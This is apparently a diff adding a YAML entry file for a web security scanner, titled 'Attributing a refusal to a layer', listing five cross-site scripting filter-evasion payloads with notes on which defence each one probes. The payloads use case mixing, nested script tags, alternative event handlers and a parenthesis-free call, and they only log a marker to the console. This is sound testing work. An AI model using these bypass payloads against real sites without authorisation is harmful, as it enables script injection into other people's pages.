@@ -1,0 +1,31 @@
+# Which of four layers refused a payload. The marker is computed or unique,
+# never a literal the request also carries; a reflected proof may raise a
+# dialog, a stored one may not.
+id: xss/evasion
+title: Attributing a refusal to a layer
+reviewed: "2026-08-31"
+variables: [MARKER]
+safety: >-
+  These entries establish which layer refused a payload. None is more dangerous
+  than the payload it explains, and a form that survives a filter is recorded so
+  the context unit can be re-run rather than being escalated here.
+entries:
+  - name: case variation
+    payload: "<ImG sRc=x oNeRrOr=console.log('{{MARKER}}')>"
+    detect: "Accepted where the refusal was a case-sensitive signature list; refused where a parser is doing the work."
+
+  - name: survives a stripping filter
+    payload: "<scr<script>ipt>console.log('{{MARKER}}')</scr</script>ipt>"
+    detect: "Becomes valid only after the filter has removed its own match. No rejecting filter produces this, so a positive here identifies the mechanism as removal."
+
+  - name: alternative event
+    payload: "<video src=x onerror=console.log('{{MARKER}}')></video>"
+    detect: "Separates a list of element names from a list of event names; a refusal of one and acceptance of the other says which list exists."
+
+  - name: no-parenthesis form
+    payload: "<img src=x onerror=window['con'+'sole'].log`{{MARKER}}`>"
+    detect: "Accepted where the filter matches on a call's punctuation rather than on the expression."
+
+  - name: policy control
+    payload: "<img src=x onerror=console.log('{{MARKER}}')>"
+    detect: "The plain form. Present intact in the raw body with nothing running means the mechanism is a browser policy and not an encoder -- read the response headers, not the payload."
